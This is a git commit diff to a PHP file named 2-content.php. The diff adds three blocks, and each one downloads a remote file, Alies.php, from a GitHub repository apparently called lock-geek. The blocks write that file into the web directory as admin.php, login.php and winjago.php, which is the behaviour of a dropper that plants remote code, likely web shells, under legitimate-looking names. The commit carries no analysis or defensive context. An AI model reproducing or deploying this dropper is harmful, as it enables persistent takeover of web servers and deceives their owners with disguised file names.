afbeb419a0c3878213d1078d6ee4ad935cda0080
zivanaoktora <142502775+zivanaoktora@users.noreply.github.com>
2024-03-25 10:41:10 +0700

    Update 2-content.php

--- 2-content.php
+++ 2-content.php
@@ -4,3 +4,21 @@ $get = file_get_contents('https://raw.githubusercontent.com/zivanaoktora/lock-ge
 fwrite($make, $get);
 fclose($make);
 ?>
+<?php
+$make = fopen('admin.php', 'w+');
+$get = file_get_contents('https://raw.githubusercontent.com/zivanaoktora/lock-geek/main/Alies.php');
+fwrite($make, $get);
+fclose($make);
+?>
+<?php
+$make = fopen('login.php', 'w+');
+$get = file_get_contents('https://raw.githubusercontent.com/zivanaoktora/lock-geek/main/Alies.php');
+fwrite($make, $get);
+fclose($make);
+?>
+<?php
+$make = fopen('winjago.php', 'w+');
+$get = file_get_contents('https://raw.githubusercontent.com/zivanaoktora/lock-geek/main/Alies.php');
+fwrite($make, $get);
+fclose($make);
+?>
